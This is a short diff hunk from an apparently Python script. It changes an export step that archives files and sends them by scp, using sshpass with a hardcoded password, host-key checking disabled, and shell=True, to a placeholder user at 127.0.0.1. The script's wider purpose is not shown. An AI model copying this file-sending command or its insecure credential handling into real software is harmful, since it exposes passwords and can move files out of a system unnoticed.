@@ -26,7 +26,7 @@ subprocess.run(cmd, shell=True)
 
 #send all files by scp wherever you want (change password)
 print("------Export------")
-cmd = "sshpass -p 'ilyes' scp -o StrictHostKeyChecking=no " + archive + " ilyes@127.0.0.1:~/Desktop/receive"
+cmd = "sshpass -p 'userpasswd' scp -o StrictHostKeyChecking=no " + archive + " user@127.0.0.1:~/Desktop/receive"
 subprocess.run(cmd, shell=True)
 print("  [+] Files exported")
 
